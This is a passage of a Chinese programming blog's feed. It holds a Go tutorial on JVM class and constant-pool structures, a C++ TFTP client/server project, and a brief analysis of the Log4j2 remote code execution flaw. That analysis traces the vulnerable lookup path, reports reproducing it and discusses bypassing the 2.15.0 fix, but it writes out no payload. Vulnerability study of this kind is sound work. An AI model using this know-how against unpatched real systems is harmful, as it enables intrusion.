cf.ConstantPool())   class.fields = newFields(class, cf.Fields())   class.methods = newMethods(class, cf.Methods())   return class  &#125;</code></pre><p>其中用到的函数会在后面给出，那么是如何实现访问标志属性的确认的呢？如下图的0XEF是类访问标志，其中的0x0021= 0x0001｜0x0020取得，故类访问标志的代码如下所示：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyl78mpyf3j30yq04c0u1.jpg" alt=""></p><pre><code class="go">func (self *Class) IsPublic() bool &#123;   return 0 != self.accessFlags&amp;ACC_PUBLIC  &#125;</code></pre><p>其余代码也类似。</p><h3 id="1-2-2-字段表"><a href="#1-2-2-字段表" class="headerlink" title="1.2.2 字段表"></a>1.2.2 字段表</h3><p>字段和方法都属于类的成员，他们都有相同的信息（访问标志、名字、描述符）。故先创建一个结构体存放这些信息来减少代码。下面的结构是一样的，但是字段表和方法表的属性表是不同的（attributes）<br>字段表结构<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyl7hnq9zgj30zi06o74y.jpg" alt=""><br>方法表结构<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyl7hxfdk1j310y07sgmd.jpg" alt=""><br>在rtda\heap目录下创建class_member.go文件，在其中ClassMember结构体</p><pre><code class="go">type ClassMember struct &#123;   accessFlags       uint16   name              string   descriptor    string   class        *Class  &#125;</code></pre><p>这里面除了前三个字段外还存放了一个Class结构体指针。</p><p>copyMemberInfo()</p><pre><code class="go">func (self *ClassMember) copyMemberInfo(memberInfo *classfile.MemberInfo)  &#123;   self.accessFlags = memberInfo.AccessFlags()   self.name = memberInfo.Name()   self.descriptor = memberInfo.Descriptor()  &#125;</code></pre><p>ClassMember定义好后后面就要处理字段信息的处理了，在rtda\heap目录下创建field.go文件，</p><pre><code class="go">type Field struct &#123;   ClassMember   slotId              uint   constValueIndex       uint  &#125;</code></pre><p>Field结构体的字段比较简单，继承了ClassMember的所有信息，而对于slotId和constValueIndex的字段是属性表标识字段索引和值索引的作用。如下图所示：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyl92jssp6j31fg0hmwoy.jpg" alt=""><br>其中的descriptor_inedx的值是8即Z代表的是boolean，故该字段表示的是public static final boolean FLAG = true;<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyl94pc0qnj310i09awfj.jpg" alt=""><br>下面是newFields()</p><pre><code class="go">func newFields(class *Class, cfFields []*classfile.MemberInfo) []*Field &#123;   fields := make([]*Field, len(cfFields))   for i, cfField := range cfFields &#123;   fields[i] = &amp;Field&#123;&#125;   fields[i].class = class        fields[i].copyMemberInfo(cfField)   fields[i].copyAttributes(cfField)   &#125; return fields  &#125;</code></pre><pre><code class="go">func (self *Field) copyAttributes(cfField *classfile.MemberInfo) &#123;       if valAttr := cfField.ConstantValueAttribute(); valAttr != nil &#123;     self.constValueIndex = uint(valAttr.ConstantValueIndex())       &#125;&#125;</code></pre><h3 id="1-2-3-方法表"><a href="#1-2-3-方法表" class="headerlink" title="1.2.3 方法表"></a>1.2.3 方法表</h3><p>在rtda\heap目录下创建method.go文件，在其中定义Method结构体，代码如下：</p><pre><code class="go">type Method struct &#123;   ClassMember   maxStack      uint   maxLocals     uint   code         []byte  &#125;</code></pre><p>maxStack和maxLocals字段分别存放操作数栈和局部变量表大小，code字段存放方法字节码，newMethods()函数根据class文件中的方法信息创建Method表</p><pre><code class="go">func newMethods(class *Class, cfMethods []*classfile.MemberInfo) []*Method &#123;   methods := make([]*Method, len(cfMethods))   for i, cfMethod := range cfMethods &#123;   methods[i] = &amp;Method&#123;&#125;   methods[i].class = class        methods[i].copyMemberInfo(cfMethod)   methods[i].copyAttributes(cfMethod)   &#125; return methods  &#125;</code></pre><pre><code class="go">func (self *Method) copyAttributes(cfMethod *classfile.MemberInfo) &#123;   if codeAttr := cfMethod.CodeAttribute(); codeAttr != nil &#123;   self.maxStack = codeAttr.MaxStack()   self.maxLocals = codeAttr.MaxLocals()   self.code = codeAttr.Code()   &#125;&#125;</code></pre><p> 结构体关系如下<br> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gylclmh6q2j316g0ik74z.jpg" alt=""></p><h3 id="1-2-4-其他信息"><a href="#1-2-4-其他信息" class="headerlink" title="1.2.4 其他信息"></a>1.2.4 其他信息</h3><p> staticSlotCount和instanceSlotCount字段分别存放类变量和实例变量占据的空间大小，staticVars字段存放静态变量。</p><h2 id="二、-运行时常量池"><a href="#二、-运行时常量池" class="headerlink" title="二、 运行时常量池"></a>二、 运行时常量池</h2><p> 运行时常量池中主要存放两大类常量：字面量（Literal）和符号引用（Symbolic Reference），字面量比较接近Java语言层面的常量概念，如文本字符串、被声明为final的常量值。而符合引用则属于编译原理方面的概念。在rtda/heap目录下创建constant_pool.go文件，在其中定义Constant接口和ConstantPool结构体，</p><pre><code class="go"> type Constant interface &#123;&#125;  type ConstantPool struct &#123;   class     *Class   consts        []Constant  &#125;</code></pre><p>GetConstant()方法根据索引返回常量</p><pre><code class="GO">func (self *ConstantPool) GetConstant(index uint) Constant &#123;   if c := self.consts[index]; c != nil &#123;   return c     &#125;   panic(fmt.Sprintf(&quot;No constants at index %d&quot;, index))  &#125;</code></pre><p>而newConstantPool()函数把class文件中的常量池转换成运行时常量池，其中的核心逻辑就是将[]classfile.ConstantInfo转换成[]heap.Constant,代码如下：</p><pre><code class="go">func newConstantPool(class *Class, cfCp classfile.ConstantPool) *ConstantPool &#123;   cpCount := len(cfCp)   consts := make([]Constant, cpCount)   rtCp := &amp;ConstantPool&#123;class, consts&#125;   for i := 1; i &lt; cpCount; i++ &#123;   cpInfo := cfCp[i]   switch cpInfo.(type) &#123;   case *classfile.ConstantIntegerInfo:           intInfo := cpInfo.(*classfile.ConstantIntegerInfo)   consts[i] = intInfo.Value()   case *classfile.ConstantFloatInfo:           floatInfo := cpInfo.(*classfile.ConstantFloatInfo)   consts[i] = floatInfo.Value()   case *classfile.ConstantLongInfo:           longInfo := cpInfo.(*classfile.ConstantLongInfo)   consts[i] = longInfo.Value()   i++   case *classfile.ConstantDoubleInfo:           doubleInfo := cpInfo.(*classfile.ConstantDoubleInfo)   consts[i] = doubleInfo.Value()   i++   case *classfile.ConstantStringInfo:           stringInfo := cpInfo.(*classfile.ConstantStringInfo)   consts[i] = stringInfo.String()   case *classfile.ConstantClassInfo:           classInfo := cpInfo.(*classfile.ConstantClassInfo)   consts[i] = newClassRef(rtCp, classInfo)   case *classfile.ConstantFieldrefInfo:           fieldrefInfo := cpInfo.(*classfile.ConstantFieldrefInfo)   consts[i] = newFieldRef(rtCp, fieldrefInfo)   case *classfile.ConstantMethodrefInfo:           methodrefInfo := cpInfo.(*classfile.ConstantMethodrefInfo)   consts[i] = newMethodRef(rtCp, methodrefInfo)   case *classfile.ConstantInterfaceMethodrefInfo:           methodrefInfo := cpInfo.(*classfile.ConstantInterfaceMethodrefInfo)   consts[i] = newInterfaceMethodRef(rtCp, methodrefInfo)   default:           // todo   &#125;   &#125;   return rtCp  &#125;</code></pre><p>但是其中类、字段、方法和接口方法的符号引用需要进行处理。</p><h3 id="2-1-类符号引用"><a href="#2-1-类符号引用" class="headerlink" title="2.1 类符号引用"></a>2.1 类符号引用</h3><p>这四种符号引用存在共性故先定义一个结构体来减少重复代码，在rtda/heap目录下创建cp_symref.go文件</p><pre><code class="go">type SymRef struct &#123;   cp           *ConstantPool   className  string   class     *Class  &#125;</code></pre><p>cp字段存放符号引用所在的运行时常量池指针，这样就可以通过符号音乐访问到运行时常量池，又可以进一步访问到类数据，className字段存放类完全限定类名，class字段缓存解析后的类结构体指针。</p><p>在rtda/heap目录下创建cp_classref.go文件，在其中定义ClassRef结构体，</p><pre><code class="go">type ClassRef struct &#123;   SymRef  &#125;</code></pre><p>newClassRef()根据class文件中存储的类常量创建ClassRef实例</p><pre><code class="go">func newClassRef(cp *ConstantPool, classInfo *classfile.ConstantClassInfo) *ClassRef &#123;   ref := &amp;ClassRef&#123;&#125;   ref.cp = cp     ref.className = classInfo.Name()   return ref  &#125;</code></pre><h3 id="2-2-字段符号引用"><a href="#2-2-字段符号引用" class="headerlink" title="2.2 字段符号引用"></a>2.2 字段符号引用</h3><p>在rtda\heap目录下创建cp_memberref.go文件</p><pre><code class="go">type MemberRef struct &#123;   SymRef   name      string   descriptor string  &#125;</code></pre><p>newFieldRef()创建实例</p><pre><code class="go">func newFieldRef(cp *ConstantPool, refInfo *classfile.ConstantFieldrefInfo) *FieldRef &#123;   ref := &amp;FieldRef&#123;&#125;   ref.cp = cp     ref.copyMemberRefInfo(&amp;refInfo.ConstantMemberrefInfo)   return ref  &#125;</code></pre><h3 id="2-3-接口方法符号引用"><a href="#2-3-接口方法符号引用" class="headerlink" title="2.3 接口方法符号引用"></a>2.3 接口方法符号引用</h3><p>rtda/heap目录下创建cp_interface_methodref.go</p><pre><code class="go">type InterfaceMethodRef struct &#123;   MemberRef   method * Method  &#125;  func newInterfaceMethodRef(cp *ConstantPool, refInfo *classfile.ConstantInterfaceMethodrefInfo) *InterfaceMethodRef &#123;   ref := &amp;InterfaceMethodRef&#123;&#125;   ref.cp = cp     ref.copyMemberRefInfo(&amp;refInfo.ConstantMemberrefInfo)   return ref  &#125;</code></pre><p>下面是继承结构<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gylfs9ze2qj30q00hegm7.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--类和对象（一）
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Apache Log4j2 远程代码执行漏洞 简析</title>
    <link href="http://yoursite.com/2021/12/13/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E7%AE%80%E6%9E%90/"/>
    <id>http://yoursite.com/2021/12/13/Apache%20Log4j2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E7%AE%80%E6%9E%90/</id>
    <published>2021-12-13T01:06:01.000Z</published>
    <updated>2021-12-13T01:58:18.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。</p><pre><code>“ Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the StrLookup interface. ”</code></pre><p>以上内容复制与官方文档，表示lookup将某些特殊值引入到日志中。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>IDEA 2021.2<br>Java zulu1.8.121<br>Apache log4j2 2.14.0</p><pre><code>&lt;dependencies&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;      &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;      &lt;version&gt;2.14.0&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;      &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;      &lt;version&gt;2.14.0&lt;/version&gt;  &lt;/dependency&gt;  </code></pre></dependencies><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>但是大于2.14.1之上的版本需要进行绕过</p><h2 id="已知影响组件"><a href="#已知影响组件" class="headerlink" title="已知影响组件"></a>已知影响组件</h2><ul><li>Apache Struts2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li><li>ElasticSearch</li><li>flume</li><li>dubbo</li><li>Redis</li><li>logstash</li><li>kafka</li></ul><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9tlb1xzej31fw0d4q49.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9t6am00dj31dg0u00z8.jpg" alt=""><br>如上substitute()的函数就是在传递进来字符串中解析类似与url的字符串并且送入resolveVariable()进行解析。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9tgocytnj31mo04ogn6.jpg" alt=""></p><p>而resolveVariable()则会利用三元表达式判断，如果非空就传入lookup。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9tb0s88lj31mk056myq.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9thbs61tj318y0lw424.jpg" alt=""></p><p>最后到这里进行触发。最后弹出计算器<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx9urfauanj31u00u0wjz.jpg" alt=""></p><h1 id="2-15-0"><a href="#2-15-0" class="headerlink" title="2.15.0"></a>2.15.0</h1><p>在2.15.0的版本中对log4j2进行了修复，我对其流程进行了观察，其他流程都是大抵一致的，不同的是在触发漏洞的前一步中，并没有跳转到漏洞点。就是在PatternFormatter#format中会对一个数组进行遍历，并去访问其中的format方法。如图：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbweq8ww3j31mk09a0up.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbwfudj7ij30y60akgmp.jpg" alt=""><br>然而在新版本中的MessagePatternConverter中同样也是可以触发的<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbwj86dubj31b20cgtb0.jpg" alt=""><br>但是在便利的类中并不存在MessagePatternConverter，也就不会去访问它的format。相反替代它的是SimpleMessagePatternConverter，而这个类并不能触发漏洞，<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbw86dpcij31c00u0dmm.jpg" alt=""></p><p>除此之外还需要打开lookup的功能，而这两个都需要用户配置，不知道还有没有其他方法绕过。具体的代码下面就不贴了。最后成功进入。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbwxw29u7j31c00u0ahj.jpg" alt=""><br>接着触发lookup（需打开lookup）<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxbx2i6syrj31ac0u0jxs.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析的漏洞还蛮简单的，没有看别人的文章，不过绕过RC1的时候出了一些问题暂时还没解决QAQ。最近的手撸jvm虚拟机也卡壳了，期末要到了，有很多大作业要做。</p>]]></content>
    
    <summary type="html">
    
      Apache Log4j2 远程代码执行漏洞 简析
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>C++编程实现基于UDP的TFTP程序</title>
    <link href="http://yoursite.com/2021/12/03/C++%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8EUDP%E7%9A%84TFTP%E7%A8%8B%E5%BA%8F/"/>
    <id>http://yoursite.com/2021/12/03/C++%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8EUDP%E7%9A%84TFTP%E7%A8%8B%E5%BA%8F/</id>
    <published>2021-12-03T04:00:01.000Z</published>
    <updated>2021-12-03T04:01:49.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TFTP协议"><a href="#TFTP协议" class="headerlink" title="TFTP协议"></a>TFTP协议</h1><p>从一个直观的数据包中可以更清晰的认识下TFTP这个协议：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwvt4u71lmj30tg03gmxw.jpg" alt=""><br>这是一个TFTP的读请求，可以看到请求端向服务器端请求一个文件rfc1530.txt，要求传输的方法是octet，也就是二进制流。服务器端收到这个请求之后，传输了558个字节的数据过来，而请求端收到这558个字节的数据后，发送一个Acknowledgement给服务器端，告诉请求端我已经妥善收到了这个558个字节。服务器端在收到这个对面的告知之后，他就知道对面已经妥善接收到这第一个数据块，于是服务器端开始向请求端发送下一个558字节。</p><pre><code>值得注意的是这里服务器端的端口是固定的，而客户端的端口则是随机的。</code></pre><h2 id="TFTP包格式"><a href="#TFTP包格式" class="headerlink" title="TFTP包格式"></a>TFTP包格式</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwz880p44vj30e00b0aar.jpg" alt=""></p><p>上面是RFC中的原图，TFTP Formats描述了TFTP数据包的具体格式，根据操作符其中一共有五种数据包，读请求，写请求，数据包，确认包和错误包。在读写请求包中先是操作符，然后是文件名随后用一个1字节的0，接着是模式即用字节还是二进制流，最后又是一个字节的0。而数据包里，主要是块号和数据，对应的应答包里是块号，这样就知道某条应答是对于哪条数据包的。</p><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h2 id="UI界面分析"><a href="#UI界面分析" class="headerlink" title="UI界面分析"></a>UI界面分析</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>关于需求分析需要分为客户端和服务端来说，首先来讲一下比较简单的服务端，对于用户来说只需要一个编辑框来显示当前的信息就行了。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul><li>IP输入框</li><li>文件夹显示（可读）</li><li>文件名输入</li><li>上传按钮</li><li>下载按钮</li><li>连接服务器按钮</li><li>退出按钮</li><li>各类提示弹窗</li></ul><h2 id="代码需求分析"><a href="#代码需求分析" class="headerlink" title="代码需求分析"></a>代码需求分析</h2><p>需要对代码进行一些宏定义，例如TFTP五种数据包： RRQ、WRQ、DATA、ACK、ERROR。</p><pre><code class="c++">#define RRQ (short)1#define WRQ (short)2#define DATA (short)3#define ACK (short)4#define ERROR (short)5#define LIST (short)6#define HEAD (short)7</code></pre><p>需要定义结构体用来解析数据包的各个字段，但是通过观察不同的数据包，他们的属性都是不相同的，所以其中应该使用联合体。除此之外还需要再定义一个结构体，用来存储放回包大小，数据包结构体指针和客户端地址。</p><pre><code class="C++">struct tftpx_packet &#123;        USHORT cmd;        union &#123;            USHORT code;            USHORT block;            // For a RRQ and WRQ TFTP packet            char filename[2];        &#125;;        char data[DATA_SIZE];    &#125;;    struct tftpx_request &#123;        int size;        struct sockaddr_in client;        struct tftpx_packet packet;    &#125;;</code></pre><p>除此之外就是WRQ、RRQ、ACK之类的处理函数和发送函数，下面再进行分析。</p><h1 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h1><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><h3 id="传输流程"><a href="#传输流程" class="headerlink" title="传输流程"></a>传输流程</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwzejttufwj30k00nowfd.jpg" alt=""></p><h3 id="服务器流程"><a href="#服务器流程" class="headerlink" title="服务器流程"></a>服务器流程</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx0eafqodbj30u00wh416.jpg" alt=""></p><h3 id="客户端流程"><a href="#客户端流程" class="headerlink" title="客户端流程"></a>客户端流程</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gx0hb18jg3j30vf0u0416.jpg" alt=""></p><h3 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h3><h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><pre><code class="c++">switch (ntohs(request-&gt;packet.cmd)) &#123;    case RRQ:        log(&quot;handle_rrq called.\n&quot;);        handle_rrq(server, request);        break;    case WRQ:        printf(&quot;handle_wrq called.\n&quot;);        handle_wrq(server, request);        break;    case LIST:        printf(&quot;handle_list called.\n&quot;);        //handle_list(server, request);        break;    default:        printf(&quot;Illegal TFTP operation.\n&quot;);        break;    &#125;</code></pre><p>RRQ处理函数，handle_rrq():</p><pre><code class="c++">int s_size = 0;    USHORT block = 1;    snd_packet.cmd = htons(DATA);    do &#123;        memset(snd_packet.data, 0, sizeof(snd_packet.data));        snd_packet.block = htons(block);        s_size = fread(snd_packet.data, 1, blocksize, fp);        if (send_packet(sock, &amp;snd_packet, s_size + 4, request) == -1) &#123;            fprintf(stderr, &quot;Error occurs when sending packet.block = %d.\n&quot;, block);            goto rrq_error;        &#125;        block++;    &#125; while (s_size == blocksize);</code></pre><p>send_packet</p><pre><code class="c++">for (rxmt = 0; rxmt &lt; PKT_MAX_RXMT; rxmt++) &#123;        str.Format(&quot;Send block=%d\n&quot;, ntohs(packet-&gt;block));        log(str);        int result = sendto(server, (char*)packet, size, 0, (LPSOCKADDR)&amp;request-&gt;client, addrlen);        if (result == -1) &#123;            return -1;        &#125;        for (time_wait_ack = 0; time_wait_ack &lt; PKT_RCV_TIMEOUT; time_wait_ack += 10000) &#123;            // Try receive(Nonblock receive).            r_size = recv(sock, (char *)&amp;rcv_packet, sizeof(struct tftpx_packet), 0);            if (r_size &gt;= 4 &amp;&amp; rcv_packet.cmd == htons(ACK) &amp;&amp; rcv_packet.block == packet-&gt;block) &#123;                str.Format(&quot;ACK: block=%d\n&quot;, ntohs(rcv_packet.block));                log(str);                // Valid ACK                break;            &#125;            Sleep(10000);        &#125;        if (time_wait_ack &lt; PKT_RCV_TIMEOUT) &#123;            break;        &#125;        else &#123;            // Retransmission.            continue;        &#125;    &#125;</code></pre><p>从上面的代码可以看出当收到RRQ的数据包就会跳转到handle_rrq()然后发送DATA数据包随后等待ACK，若收到则判断文件是否传输结束，若无，则继续传输DATA包，如果没有收到ACK则进入等待，若超过等待时间则退出。</p><p>同理下面是handle_wrq()</p><pre><code class="c++">do &#123;        for (time_wait_data = 0; time_wait_data &lt; PKT_RCV_TIMEOUT * PKT_MAX_RXMT; time_wait_data += 20000) &#123;            // Try receive(Nonblock receive).            r_size = recv(sock, (char *)&amp;rcv_packet, sizeof(struct tftpx_packet), 0);            if (r_size &gt; 0 &amp;&amp; r_size &lt; 4) &#123;                str.Format(&quot;Bad packet: r_size=%d, blocksize=%d\n&quot;, r_size, blocksize);                log(str);            &#125;            if (r_size &gt;= 4 &amp;&amp; rcv_packet.cmd == htons(DATA) &amp;&amp; rcv_packet.block == htons(block)) &#123;                str.Format(&quot;DATA: block=%d, data_size=%d\n&quot;, ntohs(rcv_packet.block), r_size - 4);                log(str);                // Valid DATA                fwrite(rcv_packet.data, 1, r_size - 4, fp);                break;            &#125;            Sleep(20000);        &#125;        if (time_wait_data &gt;= PKT_RCV_TIMEOUT * PKT_MAX_RXMT) &#123;            printf(&quot;Receive timeout.\n&quot;);            goto wrq_error;            break;        &#125;        ack_packet.block = htons(block);        if (send_ack(sock, &amp;ack_packet, 4, request) == -1) &#123;            fprintf(stderr, &quot;Error occurs when sending ACK = %d.\n&quot;, block);            log(_T(&quot;Error occurs when sending\r\n&quot;));            goto wrq_error;        &#125;        printf(&quot;Send ACK=%d\r\n&quot;, block);        block++;    &#125; while (r_size == blocksize + 4);</code></pre><p>send_ack()</p><pre><code class="c++">int CMFCTFTPSDlg::send_ack(SOCKET sock, tftpx_packet* packet, int size, tftpx_request* request)&#123;    int addrlen = sizeof(remote_addr);    int sieznew = sendto(server, (char*)packet, size, 0, (LPSOCKADDR)&amp;request-&gt;client, addrlen);    if (sieznew != size) &#123;        return -1;    &#125;    return size;&#125;</code></pre><p>和rrq的处理类似，接收DATA，发送ACK，超时则退出。</p><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><p>do_put()</p><pre><code class="c++">snd_packet.cmd = htons(WRQ);    sprintf(snd_packet.filename, &quot;%s%c%s%c%d%c&quot;, filename, 0, &quot;octet&quot;, 0, blocksize, 0);    sendto(client, (char *)&amp;snd_packet, sizeof(struct tftpx_packet), 0, (struct sockaddr*)&amp;server, addr_len);    for (time_wait_ack = 0; time_wait_ack &lt; PKT_RCV_TIMEOUT; time_wait_ack += 20000) &#123;        // Try receive(Nonblock receive).        r_size = recvfrom(client, (char *)&amp;rcv_packet, sizeof(struct tftpx_packet), 0,            (struct sockaddr*)&amp;sender,            &amp;addr_len);        if (r_size &gt; 0 &amp;&amp; r_size &lt; 4) &#123;            list_show.AddString(_T(&quot;Bad packet: r_size=%d\n&quot;));        &#125;        if (r_size &gt;= 4 &amp;&amp; rcv_packet.cmd == htons(ACK) &amp;&amp; rcv_packet.block == htons(0)) &#123;            break;        &#125;        Sleep(20000);    &#125;    if (time_wait_ack &gt;= PKT_RCV_TIMEOUT) &#123;        list_show.AddString(_T(&quot;Could not receive from server.\n&quot;));        return;    &#125;    FILE* fp = fopen(filename, &quot;r&quot;);    if (fp == NULL) &#123;        //printf(&quot;File not exists!\n&quot;);        list_show.AddString(_T(&quot;File not exists!\n&quot;));        return;    &#125;    int s_size = 0;    int rxmt;    USHORT block = 1;    snd_packet.cmd = htons(DATA);    // Send data.    do &#123;        memset(snd_packet.data, 0, sizeof(snd_packet.data));        snd_packet.block = htons(block);        s_size = fread(snd_packet.data, 1, blocksize, fp);        for (rxmt = 0; rxmt &lt; PKT_MAX_RXMT; rxmt++) &#123;            sendto(client, (char *)&amp;snd_packet, s_size + 4, 0, (struct sockaddr*)&amp;sender, addr_len);            //printf(&quot;Send %d\n&quot;, block);            CString str;            str.Format(&quot;Send %d\n&quot;, block);             list_show.AddString(str);            // Wait for ACK.            for (time_wait_ack = 0; time_wait_ack &lt; PKT_RCV_TIMEOUT; time_wait_ack += 20000) &#123;                // Try receive(Nonblock receive).                r_size = recvfrom(client, (char *)&amp;rcv_packet, sizeof(struct tftpx_packet), 0,                    (struct sockaddr*)&amp;sender,                    &amp;addr_len);                if (r_size &gt; 0 &amp;&amp; r_size &lt; 4) &#123;                    //printf(&quot;Bad packet: r_size=%d\n&quot;, r_size);                    str.Format(&quot;Bad packet: r_size=%d\n&quot;, r_size);                    list_show.AddString(str);                &#125;                if (r_size &gt;= 4 &amp;&amp; rcv_packet.cmd == htons(ACK) &amp;&amp; rcv_packet.block == htons(block)) &#123;                    break;                &#125;                Sleep(20000);            &#125;            if (time_wait_ack &lt; PKT_RCV_TIMEOUT) &#123;                // Send success.                break;            &#125;            else &#123;                // Retransmission.                continue;            &#125;        &#125;        if (rxmt &gt;= PKT_MAX_RXMT) &#123;            //printf(&quot;Could not receive from server.\n&quot;);            return;        &#125;        block++;    &#125; while (s_size &gt;= blocksize);</code></pre><p>do_put()函数是发送WRQ的数据包的处理函数，首先先发WRQ包，打开文件读取文件后，发送DATA数据包，等待ACK后面的处理流程同上。do_get()函数也基本类似，关键代码如下。<br>do_get()</p><pre><code class="c++">snd_packet.cmd = htons(ACK);    do &#123;        for (time_wait_data = 0; time_wait_data &lt; PKT_RCV_TIMEOUT * PKT_MAX_RXMT; time_wait_data += 10000) &#123;            // Try receive(Nonblock receive).            r_size = recvfrom(client, (char *)&amp;rcv_packet, sizeof(struct tftpx_packet), 0,                (struct sockaddr*)&amp;server,                &amp;addr_len);            if (r_size &gt; 0 &amp;&amp; r_size &lt; 4) &#123;                printf(&quot;Bad packet: r_size=%d\n&quot;, r_size);            &#125;            if (r_size &gt;= 4 &amp;&amp; rcv_packet.cmd == htons(DATA) &amp;&amp; rcv_packet.block == htons(block)) &#123;                printf(&quot;DATA: block=%d, data_size=%d\n&quot;, ntohs(rcv_packet.block), r_size - 4);                // Send ACK.                snd_packet.block = rcv_packet.block;                sendto(client, (char *)&amp;snd_packet, sizeof(struct tftpx_packet), 0, (struct sockaddr*)&amp;server, addr_len);                fwrite(rcv_packet.data, 1, r_size - 4, fp);                break;            &#125;            Sleep(10000);        &#125;        if (time_wait_data &gt;= PKT_RCV_TIMEOUT * PKT_MAX_RXMT) &#123;            printf(&quot;Wait for DATA #%d timeout.\n&quot;, block);            goto do_get_error;        &#125;        block++;    &#125; while (r_size == blocksize + 4);</code></pre><h2 id="设计体会"><a href="#设计体会" class="headerlink" title="设计体会"></a>设计体会</h2><p>TFTP还是存在一些问题：假设在数据发送端重新发送了他认为丢失了的数据包之后，这个确认并没有丢失，而只是迷路了，或者堵塞到某一个地方，在一些乱七八糟的机遇之后，这个确认又到达了数据发送端。那么根据上面的拗口的定义，这时候数据发送端就会根据块号发送下一个数据包。</p><p>但是很不巧，重发的那个数据包也正常的到达了对端并且对端按照协议也发送了对该数据块的确认，在数据发送端接收到这个重复的确认后，就开始有问题了，从这里开始，同一个数据块都会重复的被发送两边。如果网络状况不太好，那么这样双倍的数据包必定会导致网络流量更大，从而更加拥堵，更加可能发生上面的假设，周而复始结果网络就崩溃了。</p><p>TFTP是一个很简单的协议，但是其中很多思想都有TCP里面概念的影子，所以说有时候基础而简单的东西并不是没有意义，透过他们，你可以看到更多的演变，从而更加深理解，没有什么软件是一个版本就成型的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="http://www.woshipm.com/zhichang/2329530.html">画了多年的流程图，你真的画规范了吗？</a><br><a href="https://www.bookstack.cn/read/tcp-udp-ip/15.md">UDP的实践—TFTP</a><br>UDP的RFC协议入门</p>]]></content>
    
    <summary type="html">
    
      C++编程实现基于UDP的TFTP程序
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="c++" scheme="http://yoursite.com/tags/c/"/>
    
